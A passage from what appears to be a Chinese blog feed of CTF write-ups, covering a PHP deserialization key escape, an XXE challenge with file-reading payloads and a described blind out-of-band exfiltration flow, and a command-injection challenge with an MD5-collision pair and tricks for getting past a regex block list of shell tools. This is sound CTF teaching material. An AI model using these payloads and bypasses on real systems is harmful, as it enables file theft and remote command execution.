punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token string">";s:3:"</span>img<span class="token string">";s:20:"</span>Z3Vlc3RfaW1nLnBuZw<span class="token operator">==</span><span class="token string">";}"</span></code></pre><p>经过filter过滤后phpflag就会被替换成空，s:7:”phpflag”;s:48:” 就变成了 s:7:””;s:48:”;即完成了逃逸。<br>s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;键名img对应的字符串是d0g3_f1ag.php的base64编码。右花括号后面的;s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw==”;}”全被无视了。<br>访问后发现flag在/d0g3_fllllllag<br>/d0g3_fllllllag进行base64加密L2QwZzNfZmxsbGxsbGFn，恰巧也是20位。就替换原来的就好。</p><p>参考：<br><a href="https://www.cnblogs.com/h3zh1/p/12732336.html">https://www.cnblogs.com/h3zh1/p/12732336.html</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> extract()变量覆盖 键值逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF2019 Fake XML cookbook 1题解</title>
      <link href="/2022/03/06/NCTF2019%20Fake%20XML%20cookbook%201%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/03/06/NCTF2019%20Fake%20XML%20cookbook%201%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="NCTF2019-Fake-XML-cookbook-1题解"><a href="#NCTF2019-Fake-XML-cookbook-1题解" class="headerlink" title="NCTF2019 Fake XML cookbook 1题解"></a>NCTF2019 Fake XML cookbook 1题解</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>参考<a href="https://xz.aliyun.com/t/6887#toc-0">从XML相关一步一步到XXE漏洞</a></p><h3 id="XML注入"><a href="#XML注入" class="headerlink" title="XML注入"></a>XML注入</h3><p>XML是一种常用的标记语言，通过标签对数据进行结构化表示。XML与HTML都是SGML<br>XML是一种数据组织存储的数据结构方式，安全的XML在用户输入生成新的数据时候应该只能允许用户接受的数据，需要过滤掉一些可以改变XML标签也就是说改变XML结构插入新功能（例如新的账户信息，等于添加了账户）的特殊输入，如果没有过滤，则可以导致XML注入攻击。<br>一个例子</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>manager</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>admin</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>admin</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>admin</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>admin</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>manager</span><span class="token punctuation">></span></span></code></pre><p>如果攻击者输入</p><pre class=" language-xml"><code class="language-xml">admin <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>admin</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>admin</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hack<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>hacker<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>admin</span><span class="token punctuation">></span></span></code></pre><p>则源代码变为</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>manager</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>admin</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>admin</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>admin</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>admin</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>admin</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hack<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>hacker<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>admin</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>manager</span><span class="token punctuation">></span></span></code></pre><p>这样就通过XML注入添加了一个名为hack、密码为：hacker的管理员账户。<br>XML注入，也需要满足注入攻击的两大条件，用户能控制数据的输入；程序拼凑了数据。</p><h3 id="XML外部实体注入-XXE"><a href="#XML外部实体注入-XXE" class="headerlink" title="XML外部实体注入(XXE)"></a>XML外部实体注入(XXE)</h3><h4 id="XXE漏洞简介"><a href="#XXE漏洞简介" class="headerlink" title="XXE漏洞简介"></a>XXE漏洞简介</h4><p>XXE漏洞全称XML External Entity Injection 即XML外部实体注入。<br>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。<br>XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。<br>解析xml在php库libxml，libxml&gt;=2.9.0的版本中没有XXE漏洞。<br><a href="https://www.runoob.com/php/func-simplexml-load-string.html">simplexml_load_string()</a>可以读取XML</p><h4 id="XXE常见利用方式"><a href="#XXE常见利用方式" class="headerlink" title="XXE常见利用方式"></a>XXE常见利用方式</h4><p>与SQL相似，XXE漏洞也分为有回显和无回显<br>有回显，可以直接在页面中看到payload的执行结果或现象。<br>无回显，又称为blind xxe，可以使用外带数据(OOB)通道提取数据。即可以引用远程服务器上的XML文件读取文件。</p><h5 id="读取任意文件"><a href="#读取任意文件" class="headerlink" title="读取任意文件"></a>读取任意文件</h5><p>示例代码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'xml'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$xml</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//注释掉该语句即为无回显的情况</span><span class="token delimiter">?></span></code></pre><p>构造payload</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY ></span>&lt;!ENTITY file SYSTEM "file:///d://qwzf.txt" >]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p>读取文件，需URL编码后执行。<br>通过构造外部实体payload，在 xml 中&amp;file ; 变成了外部文件qwzf.txt中内容，导致敏感信息泄露。<br>当然，也可以使用<em><strong>php://filter</strong></em>协议读取qwzf.txt文件内容(也可以读取其他类型的文件，如：php文件)</p><pre class=" language-1"><code class="language-1">php://filter/read=convert.base64-encode/resource=</code></pre><p>如果是无回显的情况</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'xml'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//print_r($xml);//注释掉该语句即为无回显的情况</span><span class="token delimiter">?></span></code></pre><p>遇到无回显，可以通过Blind XXE方法加上外带数据通道来提取数据，先使用php://filter协议获取目标文件的内容，然后将内容以http请求发送到攻击服务器来读取数据。虽无法直接查看文件内容，但我们可以使用易受攻击的服务器作为代理，在外部网络上执行扫描以及代码。即，当无回显情况时，可以将数据发送到远程服务器(攻击服务器)。<br><em><strong>具体操作见上方文章</strong></em><br>无回显攻击流程：<br>先调用%dtd，请求远程服务器(攻击服务器)上的evil.dtd。<br>再调用 evil.dtd中的 %file。%file 获取受攻击的服务器上面的敏感文件，然后将 %file 的返回结果传到%send 。<br>然后调用 %send; 把读取到的数据发送到远程服务器上。</p><h2 id="题目详解"><a href="#题目详解" class="headerlink" title="题目详解"></a>题目详解</h2><p>进入题目，发现一个登陆框<br><img src="https://kingofkb.github.io/medias/image/20220223/dlk.png"><br>尝试输入抓包，发现<br><img src="https://kingofkb.github.io/medias/image/20220223/zb.png"><br>根据题目提示XML，猜测是XML注入，构造payload</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span><span class="token doctype">&lt;!DOCTYPE hack [&lt;!ENTITY file SYSTEM  "file:///flag"></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>hack<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre><p>得到flag:flag{86948b8f-2f55-4ff4-9ee6-07a6b21f449d}</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XML注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安洵杯 2019 easy_web 1题解</title>
      <link href="/2022/03/06/%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%20easy_web%201%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/03/06/%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%20easy_web%201%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="安洵杯-2019-easy-web-1题解"><a href="#安洵杯-2019-easy-web-1题解" class="headerlink" title="安洵杯 2019 easy_web 1题解"></a>安洵杯 2019 easy_web 1题解</h1><p>打开题目发现url</p><pre class=" language-1"><code class="language-1">http://4c1b283f-95d8-4289-8768-e8a796e68354.node4.buuoj.cn:81/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=</code></pre><p>猜测TXpVek5UTTFNbVUzTURabE5qYz0是base64加密，这里有一个小坑，相信大家都用过这个网站<a href="http://www.hiencode.com/">CTF在线工具</a>，但是这个网站是解不了这个base64码的，不知道具体原因是什么，我这里编写脚本进行解码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$t</span><span class="token operator">=</span><span class="token string">"TXpVek5UTTFNbVUzTURabE5qYz0"</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$t</span><span class="token operator">=</span><span class="token string">"MzUzNTM1MmU3MDZlNjc="</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>输出为</p><pre class=" language-1"><code class="language-1">MzUzNTM1MmU3MDZlNjc=3535352e706e67</code></pre><p>最后得到一个hex编码的文本，解码得到555.png。<br>尝试将值改为index.php，hex编码后两次base64加密得到TmprMlpUWTBOalUzT0RKbE56QTJPRGN3，传入img，得到</p><pre class=" language-1"><code class="language-1">PD9waHAKZXJyb3JfcmVwb3J0aW5nKEVfQUxMIHx8IH4gRV9OT1RJQ0UpOwpoZWFkZXIoJ2NvbnRlbnQtdHlwZTp0ZXh0L2h0bWw7Y2hhcnNldD11dGYtOCcpOwokY21kID0gJF9HRVRbJ2NtZCddOwppZiAoIWlzc2V0KCRfR0VUWydpbWcnXSkgfHwgIWlzc2V0KCRfR0VUWydjbWQnXSkpIAogICAgaGVhZGVyKCdSZWZyZXNoOjA7dXJsPS4vaW5kZXgucGhwP2ltZz1UWHBWZWs1VVRURk5iVlV6VFVSYWJFNXFZejAmY21kPScpOwokZmlsZSA9IGhleDJiaW4oYmFzZTY0X2RlY29kZShiYXNlNjRfZGVjb2RlKCRfR0VUWydpbWcnXSkpKTsKCiRmaWxlID0gcHJlZ19yZXBsYWNlKCIvW15hLXpBLVowLTkuXSsvIiwgIiIsICRmaWxlKTsKaWYgKHByZWdfbWF0Y2goIi9mbGFnL2kiLCAkZmlsZSkpIHsKICAgIGVjaG8gJzxpbWcgc3JjID0iLi9jdGYzLmpwZWciPic7CiAgICBkaWUoInhpeGnvvZ4gbm8gZmxhZyIpOwp9IGVsc2UgewogICAgJHR4dCA9IGJhc2U2NF9lbmNvZGUoZmlsZV9nZXRfY29udGVudHMoJGZpbGUpKTsKICAgIGVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL2dpZjtiYXNlNjQsIiAuICR0eHQgLiAiJz48L2ltZz4iOwogICAgZWNobyAiPGJyPiI7Cn0KZWNobyAkY21kOwplY2hvICI8YnI+IjsKaWYgKHByZWdfbWF0Y2goIi9sc3xiYXNofHRhY3xubHxtb3JlfGxlc3N8aGVhZHx3Z2V0fHRhaWx8dml8Y2F0fG9kfGdyZXB8c2VkfGJ6bW9yZXxiemxlc3N8cGNyZXxwYXN0ZXxkaWZmfGZpbGV8ZWNob3xzaHxcJ3xcInxcYHw7fCx8XCp8XD98XFx8XFxcXHxcbnxcdHxccnxceEEwfFx7fFx9fFwofFwpfFwmW15cZF18QHxcfHxcXCR8XFt8XF18e3x9fFwofFwpfC18PHw+L2kiLCAkY21kKSkgewogICAgZWNobygiZm9yYmlkIH4iKTsKICAgIGVjaG8gIjxicj4iOwp9IGVsc2UgewogICAgaWYgKChzdHJpbmcpJF9QT1NUWydhJ10gIT09IChzdHJpbmcpJF9QT1NUWydiJ10gJiYgbWQ1KCRfUE9TVFsnYSddKSA9PT0gbWQ1KCRfUE9TVFsnYiddKSkgewogICAgICAgIGVjaG8gYCRjbWRgOwogICAgfSBlbHNlIHsKICAgICAgICBlY2hvICgibWQ1IGlzIGZ1bm55IH4iKTsKICAgIH0KfQoKPz4KPGh0bWw+CjxzdHlsZT4KICBib2R5ewogICBiYWNrZ3JvdW5kOnVybCguL2JqLnBuZykgIG5vLXJlcGVhdCBjZW50ZXIgY2VudGVyOwogICBiYWNrZ3JvdW5kLXNpemU6Y292ZXI7CiAgIGJhY2tncm91bmQtYXR0YWNobWVudDpmaXhlZDsKICAgYmFja2dyb3VuZC1jb2xvcjojQ0NDQ0NDOwp9Cjwvc3R5bGU+Cjxib2R5Pgo8L2JvZHk+CjwvaHRtbD4=</code></pre><p>解码得到</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span> <span class="token operator">||</span> <span class="token operator">~</span> <span class="token constant">E_NOTICE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[^a-zA-Z0-9.]+/"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'&lt;img src ="./ctf3.jpeg">'</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"xixi～ no flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;img src='data:image/gif;base64,"</span> <span class="token punctuation">.</span> <span class="token variable">$txt</span> <span class="token punctuation">.</span> <span class="token string">"'>&lt;/img>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|&lt;|>/i"</span><span class="token punctuation">,</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">"forbid ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> `<span class="token variable">$cmd</span>`<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string">"md5 is funny ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span></span>  body<span class="token punctuation">{</span>   background<span class="token punctuation">:</span><span class="token function">url</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">/</span>bj<span class="token punctuation">.</span>png<span class="token punctuation">)</span>  no<span class="token operator">-</span>repeat center center<span class="token punctuation">;</span>   background<span class="token operator">-</span>size<span class="token punctuation">:</span>cover<span class="token punctuation">;</span>   background<span class="token operator">-</span>attachment<span class="token punctuation">:</span>fixed<span class="token punctuation">;</span>   background<span class="token operator">-</span>color<span class="token punctuation">:</span><span class="token shell-comment comment">#CCCCCC;</span><span class="token punctuation">}</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> </code></pre><p>首先这句判断排除了我们直接利用img参数获取flag的想法。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">echo</span> `<span class="token variable">$cmd</span>`<span class="token punctuation">;</span></code></pre><p>注意到cmd用反引号包裹，会执行cmd的代码。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>绕过MD5判断，注意HackBar会自动解码一次，不能正常绕过，复制payload在burpsuite里传值。</p><pre class=" language-1"><code class="language-1">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre><p>ls被ban，尝试用dir /来获得目录，得到</p><pre class=" language-1"><code class="language-1">bin   dev  flag  lib    media  opt   root  sbin  sys  usr</code></pre><p>找到flag，cat被ban，常规用cut绕过，但-被也ban，这里可以用base64 /flag绕过，得到ZmxhZ3s1MzExMTNlMS03MmQxLTQ3M2ItYjBhZi04YzE3NDhiMzgxOGR9Cg==解码得到flag:flag{531113e1-72d1-473b-b0af-8c1748b3818d}。<br>也可以用ca/t /flag绕过cat的正则判断，个人理解：/t在正则会被识别为tab，但执行命令时又当做t，达到绕过的效果。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 坑点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020 Mark loves cat 1题解</title>
      <link href="/2022/02/27/BJDCTF2020%20Mark%20loves%20cat%201%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/02/27/BJDCTF2020%20Mark%20loves%20cat%201%E9%A2%98%E8%A7%A3/</url>
      
